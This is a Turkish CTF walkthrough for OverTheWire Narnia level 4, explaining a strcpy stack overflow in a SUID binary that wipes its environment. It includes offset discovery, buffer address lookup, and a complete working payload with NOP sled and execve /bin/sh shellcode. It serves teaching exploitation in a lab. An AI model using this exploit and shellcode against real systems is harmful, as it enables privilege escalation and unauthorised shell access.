# 💥 OverTheWire Narnia — Level 4 → Level 5
## Ortam Temizlenmiş Stack Overflow (Shellcode Buffer'ın İçinde)

> narnia2'nin neredeyse aynısı: buffer'ı taşırıp EIP'yi shellcode'a
> yönlendiriyoruz. Tek fark — program açılır açılmaz **tüm environment
> variable'ları sıfırlıyor.** Yani shellcode'u bir env değişkenine koyup
> oraya atlayamayız (narnia1/narnia2'deki gibi); shellcode'u **buffer'ın
> içine** koymak zorundayız. İyi haber: buffer 256 byte, bolca yer var.

| | |
|---|---|
| **Bağlantı** | `ssh narnia4@narnia.labs.overthewire.org -p 2226` |
| **Kaynak** | `/narnia/narnia4.c` · binary: `/narnia/narnia4` |
| **Kavram** | `strcpy` overflow → EIP kontrolü → buffer içi NOP sled + shellcode |
| **Zorluk** | ⭐⭐⭐☆☆ |

**Bu level için gereken konular:**
- [`03_eip_register_kontrolu.md`](../../konu_anlatimlari/binary_exploitation/03_eip_register_kontrolu.md) — Saved EIP, cyclic ile offset
- [`04_shellcode_ve_nop_sled.md`](../../konu_anlatimlari/binary_exploitation/04_shellcode_ve_nop_sled.md) — shellcode + NOP sled
- Önce [`narnia_2-3.md`](./narnia_2-3.md) — bu level onun bir varyasyonu

---

## 🎯 Hedef

Program argümanı sınır kontrolü olmadan 256 byte'lık bir buffer'a kopyalıyor. Buffer'ı taşırıp dönüş adresini, **buffer'ın içine yerleştirdiğimiz** shellcode'a yönlendireceğiz.

---

## 📖 Kaynak Kod

```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc, char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));   // ← TÜM env değişkenlerini sıfırla

    if(argc > 1)
        strcpy(buffer, argv[1]);                        // ← AÇIK: sınır kontrolü yok

    return 0;
}
```

---

## 🔍 Kaynak Kodu Analizi — Açık Nerede?

Açık yine sınırsız `strcpy`:

```c
char buffer[256];
strcpy(buffer, argv[1]);   // 256'dan uzun argv[1] → Saved EIP ezilir
```

narnia2 ile birebir aynı mantık. **Tek fark** şu döngü:

```c
for(i = 0; environ[i] != NULL; i++)
    memset(environ[i], '\0', strlen(environ[i]));   // env değişkenlerinin İÇERİĞİNİ sıfırla
```

Bu döngü, `main`'in başında **bütün environment variable'ların içeriğini sıfırlar.** Amacı: narnia1/narnia2'de yaptığımız "shellcode'u `EGG` gibi bir env değişkenine koy, oraya atla" numarasını **engellemek.** Sen shellcode'u bir env değişkenine koysan bile, overflow'un `ret`'i tetiklendiğinde o env değişkeninin içi çoktan sıfırlanmış olur — orada shellcode kalmaz.

> 💡 **Çözüm:** Shellcode'u env'e değil, **taşırdığımız buffer'ın içine** koyacağız. `buffer[256]` zaten shellcode (25 byte) + kocaman bir NOP sled için fazlasıyla yeterli.

> ⚠️ **Sık tekrarlanan bir yanılgı:** "environ silindiği için GDB ile gerçek çalıştırma arasındaki adres farkı azalır" — bu **doğru değil.** Adres farkı, süreç `exec` edilirken (main çalışmadan ÖNCE) env değişkenleri ve `argv[0]` stack'e konduğu için oluşur. Program sonradan environ'ın *içeriğini* sıfırlasa da bu, stack düzenini **geri almaz** (string'ler hâlâ aynı yerde, sadece sıfırlarla dolu). Yani GDB-gerçek adres kayması **narnia2 ile aynıdır**; çözüm de aynı: büyük NOP sled + sled'in ortasına nişan + birkaç deneme.

---

## 📚 Gereken Teori

Bu level'ın teorisi neredeyse tamamen narnia2 ile aynı — Saved EIP'yi ezme + NOP sled. Detay için [`narnia_2-3.md`](./narnia_2-3.md) ve [`03`](../../konu_anlatimlari/binary_exploitation/03_eip_register_kontrolu.md)/[`04`](../../konu_anlatimlari/binary_exploitation/04_shellcode_ve_nop_sled.md) konularına bak.

Yeni kavram tek: **environment temizliği.** Bir SUID program, env tabanlı shellcode saldırılarını engellemek için açılışta `environ`'ı sıfırlayabilir. Bu seni shellcode'u **istismar ettiğin buffer'ın içine** koymaya zorlar — bu yüzden buffer'ın yeterince büyük olması gerekir (burada 256 byte, bol).

> 💡 **Hatırlatma:** narnia2'de olduğu gibi burada da **stack çalıştırılabilir** (NX kapalı / `-z execstack`); shellcode'u buffer'ın içine koyup oraya `ret` ile atlayabilmemizin sebebi bu. NX açık olsaydı return-to-libc'ye (narnia6) geçmemiz gerekirdi.

---

## 🧪 Adım Adım (GDB)

### Adım 1 — Offset'i `cyclic` ile bul

```bash
narnia4@narnia:/narnia$ gdb -q ./narnia4
(gdb) set disassembly-flavor intel
pwndbg> cyclic 320
aaaabaaacaaadaaa...
pwndbg> run aaaabaaacaaadaaa...            # deseni ARGÜMAN olarak ver
Program received signal SIGSEGV, Segmentation fault.
0x63616171 in ?? ()                        # ← EIP "qaac" desen parçasıyla ezildi
pwndbg> cyclic -l 0x63616171
264                                         # ← offset = 264 (sende biraz farklı olabilir)
```

pwndbg/GEF yoksa pwntools ile aynı: `cyclic(320)` üret, segfault'taki EIP değerini `cyclic_find(...)`'e ver.

> ⚠️ Offset'i **kendi binary'inde doğrula.** `264` örnektir; NOP sayısı = `offset - len(shellcode)`.

### Adım 2 — Buffer'ın adresini bul (ltrace pratik)

`environ` silindiği için adresi env değişkeninden okuyamayız; en kolayı `strcpy`'nin hedef adresini `ltrace` ile görmek:

```bash
narnia4@narnia:/narnia$ ltrace ./narnia4 $(python3 -c 'print("A"*264)') 2>&1 | grep strcpy
strcpy(0xffffd4d4, "AAAA...")              # ← buffer 0xffffd4d4 (örnek)
# alternatif (GDB):  run $(python3 -c 'print("A"*264)') ; x/40wx $esp
```

NOP sled'in **ortasına** nişan alacağız (örn. `0xffffd560`), tabanına değil.

### Adım 3 — Payload'u kur

```
yapı:  [ NOP * 239 ] + [ shellcode 25 byte ] + [ RET_ADDR 4 byte ]
        └── 239 + 25 = 264 = offset ──┘          └ Saved EIP'yi ezer ┘

NOP sayısı = offset - len(shellcode) = 264 - 25 = 239
RET_ADDR   = NOP bölgesinde bir adres (ortaya nişanla)
DİKKAT:    Burada "BBBB" gibi fazladan dolgu YOK — NOP+shellcode tam 264 olmalı,
           ardından adres doğrudan Saved EIP'ye otursun.
```

---

## ▶️ Çalıştırma

```bash
narnia4@narnia:/narnia$ ./narnia4 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*239 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + b"\x60\xd5\xff\xff")')"
$ cat /etc/narnia_pass/narnia5
<şifre buraya gelir>
```

Şifreyi okuyamadıysan adresin NOP sled'e isabet etmemiştir — adresi birkaç değer kaydırarak dene (aşağıya bak).

---

## ⚠️ Yaygın Hatalar / Tuzaklar

**1. Shellcode'u env değişkenine koymaya çalışmak.** İşe yaramaz — `main` daha en başta environ'ı sıfırlıyor. Shellcode **buffer'ın içinde** olmak zorunda.

**2. GDB adresinin gerçek adres olduğunu sanmak.** narnia2'deki aynı kayma burada da var (environ temizliği bunu değiştirmez). Büyük sled (239 zaten bol) + ortaya nişan + `0xffffd550`, `0xffffd560`, `0xffffd570`... deneyerek ayarla.

**3. Payload'u pipe'la vermek.** narnia4 `argv[1]` okur → `./narnia4 "$(...)"`. Pipe ile değil.

**4. Fazladan dolgu eklemek.** NOP + shellcode tam `offset` (264) olmalı; araya "BBBB" koyarsan adres Saved EIP'ye 4 byte kaymış oturur, ıskalar.

**5. `print()` ile ham byte göndermek.** Shellcode/`\x90` bozulur → `sys.stdout.buffer.write(b"...")`.

**6. Yetki düştüyse şifreyi okuyamamak.** narnia4'te `setreuid` yok; shell açılınca `euid` narnia5 olduğu için `cat /etc/narnia_pass/narnia5` çalışır. "Permission denied" alırsan shellcode'a `setreuid(geteuid(),geteuid())` ekleyen varyant kullan.

---

## ✅ Ne Öğrendik

- Bir SUID program açılışta `environ`'ı sıfırlayarak **env tabanlı shellcode** saldırılarını engelleyebilir.
- O zaman shellcode'u **istismar ettiğin buffer'ın içine** koyarsın — buffer yeterince büyükse (burada 256) sorun olmaz.
- `environ`'ın içeriğini sonradan silmek **stack düzenini/adresleri değiştirmez**; GDB-gerçek kayması narnia2 ile aynıdır.
- Buffer adresini bulmanın pratik yolu: `ltrace` ile `strcpy`'nin hedef adresini okumak.

Bir sonraki level bambaşka bir sınıfa geçiyor: artık buffer overflow yok, **format string** açığı var — `%n` ile belleğe yazacağız.

---

## ⬅️➡️ Gezinme

- **Önceki:** [Level 3 → Level 4 — Buffer Overflow + Sembolik Link](./narnia_3-4.md)
- **Sonraki:** [Level 5 → Level 6 — Format String Saldırısı](./narnia_5-6.md)

---

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
